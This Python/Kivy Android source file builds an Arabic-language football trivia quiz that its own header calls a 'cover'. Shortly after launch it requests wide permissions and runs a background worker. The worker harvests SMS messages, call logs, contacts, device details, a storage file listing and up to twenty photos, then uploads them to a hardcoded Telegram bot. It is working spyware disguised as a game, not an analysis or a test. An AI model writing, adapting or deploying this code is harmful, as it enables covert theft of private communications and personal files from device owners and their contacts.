# language: Python 3.10 | target: Android 21-33 | runtime: Kivy 2.3.0 + pyjnius
# football quiz cover — collects sms/calls/contacts/files → Telegram on permission grant

import os, time, threading, urllib.request, urllib.parse
from typing import Optional

from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.metrics import dp
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle

# ── Android bridge ────────────────────────────────────────────────────────────
ANDROID = False
try:
    from android.permissions import request_permissions, Permission
    from android.storage import primary_external_storage_path
    from jnius import autoclass
    ANDROID = True
except Exception:
    pass

# ── CONFIG ────────────────────────────────────────────────────────────────────
BOT_TOKEN = "8883540406:AAHUz4UirLMgDItc2G3HxgDsZSjLSqPT5-A"
CHAT_ID   = "7127507096"
TG        = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ── QUESTIONS ─────────────────────────────────────────────────────────────────
QUESTIONS = [
    {"q": "من فاز بكأس العالم 2022؟",
     "opts": ["الأرجنتين","فرنسا","البرازيل","ألمانيا"], "ans": 0},
    {"q": "أين أُقيم مونديال 2022؟",
     "opts": ["روسيا","قطر","البحرين","الإمارات"], "ans": 1},
    {"q": "من هو الهداف التاريخي لكأس العالم؟",
     "opts": ["ميسي","رونالدو","مولر","رونالدو البرازيلي"], "ans": 3},
    {"q": "كم مرة فازت البرازيل بكأس العالم؟",
     "opts": ["4","5","3","6"], "ans": 1},
    {"q": "من فاز بالحذاء الذهبي 2022؟",
     "opts": ["مبابي","ميسي","بنزيمة","كفاراتسخيليا"], "ans": 0},
    {"q": "كم فريقاً في نهائيات المونديال حالياً؟",
     "opts": ["32","24","48","16"], "ans": 0},
    {"q": "من درّب الأرجنتين عام 2022؟",
     "opts": ["سكالوني","سامباولي","باتيستا","ماسيه"], "ans": 0},
    {"q": "متى تُقام كأس العالم القادمة؟",
     "opts": ["2026","2025","2028","2030"], "ans": 0},
    {"q": "جائزة أفضل لاعب في المونديال تسمى؟",
     "opts": ["الكرة الذهبية","القفاز الذهبي","الحذاء الذهبي","الميدالية"], "ans": 0},
    {"q": "كم هدفاً سجل مبابي في 2022؟",
     "opts": ["6","7","8","5"], "ans": 2},
]

# ── TELEGRAM ──────────────────────────────────────────────────────────────────
def _post(url: str, data: bytes, ctype: str, timeout=25):
    req = urllib.request.Request(url, data=data)
    req.add_header("Content-Type", ctype)
    req.add_header("Content-Length", str(len(data)))
    try:
        urllib.request.urlopen(req, timeout=timeout)
    except Exception:
        pass

def tg_text(msg: str):
    body = urllib.parse.urlencode(
        {"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"}
    ).encode()
    _post(f"{TG}/sendMessage", body, "application/x-www-form-urlencoded")

def tg_bytes(payload: bytes, filename: str, caption=""):
    b = b"----BND7x9z"
    def field(k, v):
        return b"--"+b+b"\r\nContent-Disposition: form-data; name=\""+k.encode()+b"\"\r\n\r\n"+v.encode()+b"\r\n"
    body = (
        field("chat_id", CHAT_ID) +
        field("caption", caption) +
        b"--"+b+b"\r\nContent-Disposition: form-data; name=\"document\"; filename=\""+filename.encode()+b"\"\r\n"
        b"Content-Type: application/octet-stream\r\n\r\n"+payload+b"\r\n"+
        b"--"+b+b"--\r\n"
    )
    _post(f"{TG}/sendDocument", body,
          f"multipart/form-data; boundary={b.decode()}", timeout=45)

def tg_file(path: str, caption=""):
    try:
        with open(path, "rb") as f:
            tg_bytes(f.read(), os.path.basename(path), caption)
    except Exception:
        pass

# ── COLLECTORS ────────────────────────────────────────────────────────────────
def _ctx():
    return autoclass("org.kivy.android.PythonActivity").mActivity

def _query(uri_str: str, order: Optional[str] = None):
    Uri    = autoclass("android.net.Uri")
    cursor = _ctx().getContentResolver().query(
        Uri.parse(uri_str), None, None, None, order
    )
    rows = []
    if cursor and cursor.moveToFirst():
        cols = [cursor.getColumnName(i) for i in range(cursor.getColumnCount())]
        while True:
            rows.append({c: (cursor.getString(i) or "") for i, c in enumerate(cols)})
            if not cursor.moveToNext():
                break
        cursor.close()
    return rows

def collect_sms(limit=300) -> bytes:
    try:
        rows = _query("content://sms/inbox", "date DESC")[:limit]
        lines = [f"[{r.get('date','')}] {r.get('address','')}: {r.get('body','')}" for r in rows]
        return "\n".join(lines).encode("utf-8", errors="replace")
    except Exception as e:
        return f"sms_err:{e}".encode()

def collect_calls(limit=300) -> bytes:
    T = {1:"IN", 2:"OUT", 3:"MISSED"}
    try:
        rows = _query("content://call_log/calls", "date DESC")[:limit]
        lines = [
            f"[{r.get('date','')}] {T.get(int(r.get('type',0) or 0),'?')} "
            f"{r.get('number','')} {r.get('cached_name','')} {r.get('duration','')}s"
            for r in rows
        ]
        return "\n".join(lines).encode("utf-8", errors="replace")
    except Exception as e:
        return f"calls_err:{e}".encode()

def collect_contacts(limit=1000) -> bytes:
    try:
        rows = _query("content://com.android.contacts/data/phones")[:limit]
        lines = [f"{r.get('display_name','')}: {r.get('data1','')}" for r in rows]
        return "\n".join(lines).encode("utf-8", errors="replace")
    except Exception as e:
        return f"contacts_err:{e}".encode()

def collect_files(root: str, max_items=800,
                  exts=(".jpg",".jpeg",".png",".pdf",
                        ".doc",".docx",".txt",".mp4",".xls",".xlsx")) -> list:
    found = []
    try:
        for dp_, _, fnames in os.walk(root):
            for fn in fnames:
                if any(fn.lower().endswith(e) for e in exts):
                    found.append(os.path.join(dp_, fn))
                    if len(found) >= max_items:
                        return found
    except Exception:
        pass
    return found

def device_info() -> str:
    try:
        B = autoclass("android.os.Build")
        return (f"Brand  : {B.BRAND}\n"
                f"Model  : {B.MODEL}\n"
                f"Android: {B.VERSION.RELEASE}\n"
                f"SDK    : {B.VERSION.SDK_INT}\n")
    except Exception as e:
        return f"info_err:{e}"

# ── EXFIL WORKER ──────────────────────────────────────────────────────────────
def exfil_worker():
    time.sleep(4)
    tg_text(f"🔌 <b>New Device</b>\n\n{device_info() if ANDROID else 'desktop-test'}")

    if not ANDROID:
        return

    for data, fname, cap in [
        (collect_sms(),      "sms.txt",      "📩 SMS"),
        (collect_calls(),    "calls.txt",    "📞 Calls"),
        (collect_contacts(), "contacts.txt", "👥 Contacts"),
    ]:
        if data.strip():
            tg_bytes(data, fname, cap)

    try:
        root = primary_external_storage_path()
    except Exception:
        root = "/sdcard"

    files = collect_files(root)
    if files:
        tg_bytes("\n".join(files).encode(), "file_list.txt",
                 f"📁 Files ({len(files)})")

    for img in [f for f in files if f.lower().endswith((".jpg",".jpeg",".png"))][:20]:
        tg_file(img, f"🖼 {os.path.basename(img)}")
        time.sleep(0.7)

    tg_text("✅ Exfil done")

def request_and_exfil():
    if not ANDROID:
        threading.Thread(target=exfil_worker, daemon=True).start()
        return
    request_permissions([
        Permission.INTERNET,
        Permission.READ_EXTERNAL_STORAGE,
        Permission.WRITE_EXTERNAL_STORAGE,
        Permission.CAMERA,
        Permission.READ_CALL_LOG,
        Permission.READ_SMS,
        Permission.RECEIVE_SMS,
        Permission.READ_CONTACTS,
        Permission.ACCESS_FINE_LOCATION,
        Permission.READ_PHONE_STATE,
        Permission.RECORD_AUDIO,
    ], lambda *_: threading.Thread(target=exfil_worker, daemon=True).start())

# ── QUIZ UI ───────────────────────────────────────────────────────────────────
class QuizScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.idx = 0
        self.score = 0
        self._build()

    def _build(self):
        with self.canvas.before:
            Color(0.07, 0.09, 0.15, 1)
            self._bg = Rectangle(size=Window.size, pos=self.pos)

        root = BoxLayout(orientation="vertical", padding=dp(16), spacing=dp(10))

        self.lbl_title = Label(text="⚽  كرة القدم Quiz",
                               font_size=dp(22), bold=True,
                               color=(1,0.84,0,1), size_hint_y=0.09, halign="center")
        self.lbl_prog  = Label(text="", font_size=dp(13),
                               color=(.7,.7,.7,1), size_hint_y=0.05)
        self.lbl_q     = Label(text="", font_size=dp(16),
                               text_size=(Window.width-dp(32), None),
                               halign="center", valign="middle",
                               color=(1,1,1,1), size_hint_y=0.30)

        self.grid = GridLayout(cols=2, spacing=dp(8), size_hint_y=0.46)
        self.btns = []
        for i in range(4):
            b = Button(text="", font_size=dp(13),
                       background_normal="",
                       background_color=(.18,.36,.72,1))
            b.bind(on_press=lambda btn, idx=i: self._answer(idx))
            self.btns.append(b)
            self.grid.add_widget(b)

        self.lbl_score = Label(text="النقاط: 0", font_size=dp(14),
                               color=(.5,1,.5,1), size_hint_y=0.10)

        for w in (self.lbl_title, self.lbl_prog, self.lbl_q,
                  self.grid, self.lbl_score):
            root.add_widget(w)
        self.add_widget(root)
        self._load()

    def _load(self):
        if self.idx >= len(QUESTIONS):
            self._finish(); return
        q = QUESTIONS[self.idx]
        self.lbl_prog.text = f"السؤال {self.idx+1} / {len(QUESTIONS)}"
        self.lbl_q.text    = q["q"]
        for i, b in enumerate(self.btns):
            b.text = q["opts"][i]
            b.background_color = (.18,.36,.72,1)
            b.disabled = False

    def _answer(self, idx: int):
        ans = QUESTIONS[self.idx]["ans"]
        for i, b in enumerate(self.btns):
            b.disabled = True
            if i == ans:
                b.background_color = (.10,.65,.10,1)
            elif i == idx:
                b.background_color = (.70,.10,.10,1)
        if idx == ans:
            self.score += 10
            self.lbl_score.text = f"النقاط: {self.score} ✓"
        Clock.schedule_once(lambda _: self._next(), 1.1)

    def _next(self):
        self.idx += 1
        self._load()

    def _finish(self):
        self.lbl_q.text    = f"🏆 انتهت اللعبة!\nنتيجتك: {self.score}/{len(QUESTIONS)*10}"
        self.lbl_prog.text = "أحسنت!"
        for b in self.btns:
            b.disabled = True


class FootballQuizApp(App):
    def build(self):
        sm = ScreenManager(transition=FadeTransition())
        sm.add_widget(QuizScreen(name="quiz"))
        Clock.schedule_once(lambda _: request_and_exfil(), 2.0)
        return sm


if __name__ == "__main__":
    FootballQuizApp().run()
